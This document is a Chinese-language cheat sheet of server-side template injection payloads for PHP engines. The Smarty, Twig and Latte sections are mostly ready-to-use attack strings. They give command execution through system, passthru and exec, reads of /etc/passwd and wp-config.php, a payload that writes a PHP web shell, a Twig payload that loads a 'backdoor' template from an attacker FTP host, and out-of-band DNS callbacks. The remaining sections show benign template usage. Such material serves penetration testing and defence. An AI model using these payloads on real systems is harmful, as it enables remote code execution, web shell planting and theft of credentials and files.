# 服务器端模板注入 - PHP

> 服务器端模板注入（SSTI）是一种漏洞，当攻击者能够将恶意输入嵌入到服务器端模板中时，模板引擎会在服务器上执行任意命令。在PHP中，SSTI可能发生在使用像Smarty、Twig甚至普通PHP模板的模板引擎中，而没有进行适当的清理或验证时。

## 概述

- [模板库](#模板库)
- [Smarty](#smarty)
- [Twig](#twig)
    - [Twig - 基本注入](#twig---基本注入)
    - [Twig - 模板格式](#twig---模板格式)
    - [Twig - 随意读取文件](#twig---随意读取文件)
    - [Twig - 代码执行](#twig---代码执行)
- [Latte](#latte)
    - [Latte - 基本注入](#latte---基本注入)
    - [Latte - 代码执行](#latte---代码执行)
- [patTemplate](#pattemplate)
- [PHPlib 和 HTML_Template_PHPLIB](#phplib-and-html_template_phplib)
- [Plates](#plates)
- [参考文献](#参考文献)

## 模板库

| 模板名称   | 负载格式       |
| ---------- | -------------- |
| Laravel Blade | `{{ }}`      |
| Latte        | `{var $X=""}{$X}` |
| Mustache     | `{{ }}`      |
| Plates       | `<?= ?>`     |
| Smarty       | `{ }`        |
| Twig         | `{{ }}`      |

## Smarty

[官方网站](https://www.smarty.net/docs/en/)

> Smarty 是一个用于PHP的模板引擎。

```python
{$smarty.version}
{php}echo `id`;{/php} // 在Smarty v3中已弃用
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // 兼容v3
{system('cat index.php')} // 兼容v3
```

---

## Twig

[官方网站](https://twig.symfony.com/)

> Twig 是一个现代的PHP模板引擎。

### Twig - 基本注入

```python
{{7*7}}
{{7*'7'}} 将导致 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

### Twig - 模板格式

```python
$output = $twig->render(
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig->render(
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

### Twig - 随意读取文件

```python
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

### Twig - 代码执行

```python
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}
```

避免使用引号指定文件名的例子（通过OFFSET和LENGTH指定负载文件名）

```python
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

通过FILTER_VALIDATE_EMAIL PHP传递电子邮件的例子。

```powershell
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

---

## Latte

### Latte - 基本注入

```php
{var $X="POC"}{$X}
```

### Latte - 代码执行

```php
{php system('nslookup oastify.com')}
```

---

## patTemplate

> [patTemplate](https://github.com/wernerwa/pat-template) 是一个非编译的PHP模板引擎，使用XML标签将文档划分为不同的部分。

```xml
<patTemplate:tmpl name="page">
  这是主页面。
  <patTemplate:tmpl name="foo">
    它包含另一个模板。
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    你好，{NAME}。<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

---

## PHPlib 和 HTML_Template_PHPLIB

[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) 与PHPlib相同，但移植到了Pear。

`authors.tpl`

```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>作者</caption>
   <thead>
    <tr><th>姓名</th><th>邮箱</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```

`authors.php`

```php
<?php
// 我们想显示这个作者列表
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
// 创建模板对象
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
// 加载文件
$t->setFile('authors', 'authors.tpl');
// 设置块
$t->setBlock('authors', 'authorline', 'authorline_ref');

// 设置一些变量
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', '截至 ' . date('Y-m-d') . ' 的代码作者');

// 显示作者
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

// 完成并输出
echo $t->finish($t->parse('OUT', 'authors'));
?>
```

---

## Plates

Plates 受Twig启发，但它是原生PHP模板引擎而不是编译模板引擎。

控制器：

```php
// 创建新的Plates实例
$templates = new League\Plates\Engine('/path/to/templates');

// 渲染模板
echo $templates->render('profile', ['name' => 'Jonathan']);
```

页面模板：

```php
<?php $this->layout('template', ['title' => '用户资料']) ?>

<h1>用户资料</h1>
<p>你好，<?=$this->e($name)?></p>
```

布局模板：

```php
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```

## 参考文献

- [服务器端模板注入（SSTI）通过Twig转义处理程序 - 2024年3月21日](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)